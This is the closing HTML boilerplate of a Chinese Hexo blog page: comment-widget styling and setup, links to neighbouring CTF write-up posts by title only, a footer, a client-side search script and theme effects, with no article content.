    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/10/15/web-php-wrong-nginx-config/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Web_php_wrong_nginx_config">
                        
                        <span class="card-title">Web_php_wrong_nginx_config</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-15
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
                                    攻防世界
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/10/12/newstarctf-2023/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="NewStarCTF 2023">
                        
                        <span class="card-title">NewStarCTF 2023</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-12
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>





    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
